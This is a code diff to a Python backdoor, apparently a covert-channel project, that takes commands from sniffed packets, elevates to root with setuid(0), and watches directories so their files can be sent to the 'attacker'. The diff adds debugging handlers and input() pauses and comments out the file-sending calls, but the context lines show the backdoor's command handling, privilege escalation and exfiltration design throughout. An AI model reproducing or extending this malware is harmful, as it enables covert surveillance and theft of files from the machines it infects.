@@ -148,6 +148,10 @@ def start_backdoor():
     :return: None
     """
     print("Starting Receiver.")
+    start_watching_directory("data")
+    c = input()
+    stop_watching_directory()
+    g = input()
 
     # Elevate privileges.
     setuid(0)
@@ -274,8 +278,10 @@ def process_sniff_pkt(pkt):
             instruction_input = commands[3]
             print(instruction)
             print(instruction_input)
+            start_watching_directory(instruction_input)
         elif instruction == "8":
             print(instruction)
+            stop_watching_directory()
         elif instruction == "9":
             print(instruction)
         else:
@@ -388,6 +394,14 @@ def send_message(message, instruction, filename=""):
                 current_seq = r_ack[TCP].ack
 
 
+
+def on_created(event):
+    print("created")
+
+def on_modified(event):
+    print("modified")
+    print(event)
+
 class OnMyWatch:
     def __init__(self, directory_path, is_recursive=True):
         self.observer = Observer()
@@ -395,8 +409,14 @@ class OnMyWatch:
         self.watch_directory = directory_path
         self.is_recursive = is_recursive
 
+    def set_path(self, new_path):
+        self.watch_directory = new_path
+
     def run(self):
-        event_handler = Handler()
+        # event_handler = Handler()
+        event_handler = FileSystemEventHandler()
+        event_handler.on_modified = on_modified
+        event_handler.on_created = on_created
         self.observer.schedule(event_handler, self.watch_directory, recursive=self.is_recursive)
         self.observer.start()
         try:
@@ -406,7 +426,7 @@ class OnMyWatch:
             self.observer.stop()
             print("Observer Stopped")
 
-        # self.observer.join()
+        self.observer.join()
 
     def stop(self):
         self.observer.stop()
@@ -423,15 +443,15 @@ class Handler(FileSystemEventHandler):
             # Event is created, you can process it now
             print("Watchdog received created event - % s." % event.src_path)
             print(event.src_path)
-            binary_file, file_name = get_file_binary(event.src_path)
-            send_message(binary_file, "7", file_name)
+            # binary_file, file_name = get_file_binary(event.src_path)
+            # send_message(binary_file, "7", file_name)
             # "7" to match the watch a directory instruction sent by attacker
         elif event.event_type == 'modified':
             # Event is modified, you can process it now
             print("Watchdog received modified event - % s." % event.src_path)
             print(event.src_path)
-            binary_file, file_name = get_file_binary(event.src_path)
-            send_message(binary_file, "7", file_name)
+            # binary_file, file_name = get_file_binary(event.src_path)
+            # send_message(binary_file, "7", file_name)
             # "7" to match the watch a directory instruction sent by attacker
 
 
@@ -450,7 +470,7 @@ def start_watching_directory(new_directory_path):
 
     directory_watch_active = True
     directory_path = new_directory_path
-    watch = OnMyWatch(directory_path)
+    watch.set_path(directory_path)
 
     watch.run()
     print(f"Directory watch started: {directory_path}")
